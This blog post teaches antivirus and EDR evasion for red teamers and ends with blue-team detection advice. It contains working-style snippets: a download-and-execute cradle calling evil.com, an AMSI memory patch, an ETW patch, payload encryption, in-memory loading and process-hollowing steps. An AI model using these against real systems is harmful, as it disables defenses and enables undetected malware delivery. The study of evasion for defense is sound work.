---
title: "Modern AV Evasion Techniques: Understanding Detection and Bypass Methods"
date: 2024-12-18T10:00:00+00:00
draft: false
author: "Mahmoud Adel"
tags:
  - Red Team
  - AV Evasion
  - Malware Development
  - Penetration Testing
  - Security Research
  - Offensive Security
image: /images/av-evasion.png
description: "An in-depth look at how modern antivirus solutions detect threats and the techniques used by red teamers to bypass them during authorized engagements."
toc: true
---

Understanding how antivirus evasion works is essential for both offensive and defensive security professionals. This knowledge helps red teamers simulate advanced threats and helps blue teamers understand what they're defending against.

> ⚠️ **Disclaimer**: This content is for educational purposes and authorized security testing only. Always obtain proper authorization before testing these techniques.

## How Modern AV Detection Works

Before evading AV, you need to understand how it detects threats:

### 1. Signature-Based Detection

The oldest and most common method. AV maintains a database of known malware signatures (hashes, byte patterns, strings).

```python
# Example: Simple signature that AV might detect
malicious_string = "Invoke-Mimikatz"  # Instantly flagged
```

**Weakness**: Any modification to the binary changes the signature.

### 2. Heuristic/Behavioral Analysis

AV monitors program behavior looking for suspicious patterns:

- Process injection attempts
- Credential dumping
- Registry persistence
- Network callbacks to unknown IPs

### 3. AMSI (Antimalware Scan Interface)

Windows 10+ feature that allows AV to scan scripts before execution:

```
PowerShell Script → AMSI → AV Engine → Allow/Block
```

### 4. Machine Learning / AI

Modern AVs use ML models trained on millions of samples to detect "malware-like" characteristics even in new, unknown threats.

## Basic Evasion Techniques

### String Obfuscation

The simplest technique—break up or encode known-bad strings:

```powershell
# Detected
$cmd = "Invoke-Mimikatz"

# Evades basic signatures
$cmd = "Inv" + "oke-Mim" + "ikat" + "z"

# Base64 encoding
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Invoke-Mimikatz"))
$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
```

### Variable Substitution

```powershell
# Detected
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')

# Obfuscated
$wc = New-Object Net.WebClient
$url = 'http://evil.com/script.ps1'
IEX $wc.DownloadString($url)
```

### Case Manipulation

PowerShell is case-insensitive:

```powershell
# These are equivalent
Invoke-Expression
iNvOkE-eXpReSsIoN
```

## Intermediate Techniques

### Payload Encryption

Encrypt your payload and decrypt at runtime:

```python
from Crypto.Cipher import AES
import base64

def encrypt_payload(payload: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC)
    # Pad payload to block size
    padded = payload + b'\x00' * (16 - len(payload) % 16)
    encrypted = cipher.encrypt(padded)
    return cipher.iv + encrypted

def decrypt_payload(encrypted: bytes, key: bytes) -> bytes:
    iv = encrypted[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(encrypted[16:]).rstrip(b'\x00')
```

The key is delivered or derived separately, so static analysis sees only encrypted gibberish.

### In-Memory Execution

Never touch disk—execute entirely in memory:

```csharp
// C# - Load assembly from byte array
byte[] assemblyBytes = DownloadPayload();
Assembly assembly = Assembly.Load(assemblyBytes);
MethodInfo method = assembly.EntryPoint;
method.Invoke(null, new object[] { new string[] {} });
```

### Process Hollowing

Create a legitimate process, hollow out its memory, inject your code:

```
1. CreateProcess("svchost.exe", SUSPENDED)
2. NtUnmapViewOfSection() - Remove original code
3. VirtualAllocEx() - Allocate new memory
4. WriteProcessMemory() - Write payload
5. SetThreadContext() - Update entry point
6. ResumeThread() - Execute
```

This makes your malware run under a trusted process name.

## Advanced Techniques

### AMSI Bypass

One common technique patches AMSI in memory:

```powershell
# Concept (signature will be detected - for education only)
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*siUtils"}
$f = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
[IntPtr]$ptr = $f.GetValue($null)
[Int32[]]$patch = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 1)
```

**Note**: AMSI bypasses are quickly signatured. Custom implementations are required.

### ETW (Event Tracing for Windows) Patching

Disable telemetry that feeds into EDR:

```csharp
// Patch ntdll!EtwEventWrite to return immediately
var ntdll = GetModuleHandle("ntdll.dll");
var etwFunc = GetProcAddress(ntdll, "EtwEventWrite");
VirtualProtect(etwFunc, 1, PAGE_READWRITE, out old);
Marshal.WriteByte(etwFunc, 0xC3); // RET instruction
VirtualProtect(etwFunc, 1, old, out _);
```

### Syscall Unhooking

EDRs hook ntdll functions to monitor behavior. Bypass by:

1. **Direct syscalls** - Call kernel directly, bypassing ntdll
2. **Unhooking** - Load fresh ntdll from disk, overwrite hooked version
3. **Mapping from suspended process** - Get clean ntdll from another process

```csharp
// Direct syscall concept
// Instead of calling NtAllocateVirtualMemory through ntdll (hooked)
// Call the syscall number directly
mov r10, rcx
mov eax, 0x18  // NtAllocateVirtualMemory syscall number
syscall
ret
```

### Sleep Obfuscation

Evade memory scanners by encrypting payload during sleep:

```
1. Encrypt payload in memory
2. Sleep(60000)
3. Decrypt payload
4. Execute
5. Repeat
```

Tools like **Ekko** and **Foliage** implement this.

## Evasion Checklist

| Technique | Evades |
|-----------|--------|
| String obfuscation | Signature detection |
| Payload encryption | Static analysis |
| In-memory execution | Disk scanning |
| Process injection | Process monitoring |
| AMSI bypass | Script scanning |
| ETW patching | EDR telemetry |
| Direct syscalls | API hooking |
| Sleep obfuscation | Memory scanning |

## Testing Your Payloads

### Safe Testing Environment

```bash
# Create isolated VM
# Disable network
# Take snapshot before testing
# Use multiple AV products for coverage
```

### Online Scanners (Careful!)

- **VirusTotal** - Shares samples with AV vendors (don't use for ops)
- **AntiScan.Me** - Claims not to share (still risky)
- **Kleenscan** - Local scanning option

### Defender Emulation

Test locally without uploading:

```powershell
# Check if Defender detects file
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\payload.exe"
```

## Defense Recommendations

If you're on the blue team, here's how to detect these techniques:

1. **Enable Script Block Logging** - Captures deobfuscated PowerShell
2. **Enable Module Logging** - Logs all PowerShell module loads
3. **Monitor AMSI integrity** - Alert on AMSI tampering
4. **Use EDR with behavioral detection** - Not just signatures
5. **Enable Credential Guard** - Prevents in-memory credential theft
6. **Application whitelisting** - Only approved binaries execute

## Conclusion

AV evasion is a constant cat-and-mouse game. What works today may be detected tomorrow. The key principles remain:

1. **Avoid known signatures** - Customize everything
2. **Minimize disk artifacts** - In-memory is better
3. **Blend with legitimate behavior** - Look normal
4. **Test thoroughly** - Before any engagement
5. **Stay updated** - Techniques evolve rapidly

Understanding these techniques makes you a better penetration tester and a better defender.

Stay curious, stay ethical! 🔐
